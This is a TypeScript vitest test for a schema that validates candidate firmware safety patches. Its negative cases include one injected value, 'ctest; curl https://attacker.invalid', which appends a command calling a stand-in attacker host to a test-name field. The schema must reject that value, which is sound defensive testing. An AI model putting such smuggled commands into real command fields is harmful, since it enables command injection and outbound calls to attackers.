import { describe, expect, it } from "vitest";

import { CandidatePatchSchema } from "../../packages/domain/src/index";

const validCandidate = {
  candidateId: "candidate-safe-1",
  strategy: "fail-closed",
  hypothesis: "Latch a sensor fault and disable charging until explicit reset.",
  unifiedDiff: [
    "diff --git a/firmware/src/controller.c b/firmware/src/controller.c",
    "--- a/firmware/src/controller.c",
    "+++ b/firmware/src/controller.c",
    "@@ -1 +1 @@",
    "-return input.temperature_c;",
    "+return input.sensor_fault ? SAFE_STATE : input.temperature_c;",
  ].join("\n"),
  expectedSafetyEffect: ["Charging is disabled while sensor_fault is true."],
  risks: ["A latched fault requires an explicit reset path."],
  testsToRun: ["sensor_disconnect", "fault_latch_reset"],
} as const;

describe("CandidatePatchSchema", () => {
  it("candidate_patch_schema_is_validated", () => {
    expect(CandidatePatchSchema.safeParse(validCandidate).success).toBe(true);

    expect(
      CandidatePatchSchema.safeParse({
        ...validCandidate,
        strategy: "same-answer-with-different-wording",
      }).success,
    ).toBe(false);

    expect(
      CandidatePatchSchema.safeParse({
        ...validCandidate,
        unexpectedServerOwnedField: "must be rejected",
      }).success,
    ).toBe(false);

    expect(
      CandidatePatchSchema.safeParse({
        ...validCandidate,
        testsToRun: ["ctest; curl https://attacker.invalid"],
      }).success,
    ).toBe(false);
  });
});

